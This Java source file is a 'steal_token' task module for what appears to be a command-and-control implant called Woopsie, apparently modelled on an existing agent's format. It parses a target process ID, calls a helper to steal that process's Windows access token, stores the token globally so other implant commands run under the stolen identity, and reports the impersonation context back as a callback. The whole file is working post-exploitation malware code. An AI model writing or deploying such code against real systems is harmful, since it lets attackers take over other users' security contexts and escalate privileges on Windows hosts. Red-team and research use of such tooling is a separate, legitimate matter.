package com.woopsie.tasks;

import com.fasterxml.jackson.databind.JsonNode;
import com.woopsie.Config;
import com.woopsie.utils.WindowsAPI;

/**
 * Steal token task - impersonate another process's security context
 * Windows only
 */
public class StealTokenTask implements Task {
    
    @Override
    public String execute(Config config, JsonNode parameters) throws Exception {
        Config.debugLog(config, "Executing steal_token command");
        
        // Check if we're on Windows
        if (!WindowsAPI.isWindows()) {
            throw new Exception("steal_token is only supported on Windows");
        }
        
        // Parse PID from parameters
        int pid;
        if (parameters.has("pid")) {
            pid = parameters.get("pid").asInt();
        } else if (parameters.isInt()) {
            pid = parameters.asInt();
        } else {
            // Try parsing as text
            String pidStr = parameters.asText();
            try {
                pid = Integer.parseInt(pidStr);
            } catch (NumberFormatException e) {
                throw new Exception("Invalid PID: " + pidStr);
            }
        }
        
        if (pid <= 0) {
            throw new Exception("Invalid PID: " + pid);
        }
        
        Config.debugLog(config, "Attempting to steal token from PID: " + pid);
        Config.debugLog(config, "Current user BEFORE steal_token: " + WindowsAPI.getImpersonatedUsername());
        
        // Steal the token and get the handle
        com.woopsie.utils.WindowsAPI.TokenResult tokenResult = WindowsAPI.stealTokenWithHandle(pid);
        
        Config.debugLog(config, "Token stolen successfully");
        
        // Save the token handle globally so other commands can use it
        com.woopsie.Agent.setImpersonationToken(tokenResult.token);
        
        // Get current user context after impersonation (use thread token check)
        String impersonationContext = WindowsAPI.getImpersonatedUsername();
        Config.debugLog(config, "Current user AFTER steal_token: " + impersonationContext);
        
        // Return JSON with callback field containing impersonation_context (matches oopsie format)
        return String.format(
            "{\"user_output\": \"%s\", \"callback\": {\"impersonation_context\": \"%s\"}}",
            tokenResult.message.replace("\\", "\\\\").replace("\"", "\\\""),
            impersonationContext.replace("\\", "\\\\").replace("\"", "\\\"")
        );
    }
    
    @Override
    public String getCommandName() {
        return "steal_token";
    }
}
